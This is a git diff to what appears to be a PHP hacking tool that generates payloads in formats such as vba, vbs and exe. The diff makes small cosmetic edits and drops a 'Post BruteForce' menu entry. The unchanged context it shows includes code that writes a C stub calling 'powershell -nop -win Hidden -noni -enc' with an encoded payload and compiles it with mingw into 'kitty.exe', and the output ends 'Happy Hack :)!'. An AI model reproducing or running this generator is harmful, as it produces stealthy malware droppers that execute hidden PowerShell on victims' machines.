@@ -23,7 +23,7 @@ $a=array("
                               .@@@@%
                             @@@@@@@@
                            &@@@@@@@@%
-             @&*^#         @@@@@@@@@@
+             @&*%          @@@@@@@@@@
            &/   &,          #@@@@@@@@@,
           (&   .@           @& /@@@@@@@@
           (    &(         .@  @%.@@@@@@@@#
@@ -79,7 +79,6 @@ echo "\e[92m\e[1m +-- -- +=[ Available Format : vba , vbs , exe , java , js , ph
 echo "\e[92m\e[1m +-- -- +=[ PHP! 3meth \e[0m\n\n";
 echo "[\e[31m1\e[0m] Hash Cracker (slow with 5+ chars)\n";
 echo "[\e[31m2\e[0m] Reverse Engeneering (windows platform)\n";
-echo "[\e[31m3\e[0m] Post BruteForce   \n\n";
 echo "Enter number 1-3 :"; $Meth = trim(fgets(STDIN,8));
 
 if($Meth == '1'){
@@ -258,7 +257,6 @@ int main()
     system("powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'");
     return 0;
 }';
-echo $exe;
 $ef = fopen("c_file_temp.c", "w") or die("Unable to open file!");
 fwrite($ef, $exe);
 fclose($ef); 
@@ -270,7 +268,7 @@ if ($exe_arch == "32"){
     system("x86_64-w64-mingw32-gcc c_file_temp.c -o kitty.exe");
 }
 system("rm c_file_temp.c");
-echo "kitty.exe created!\n\n";
+echo "/kitty.exe created!";
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
 }
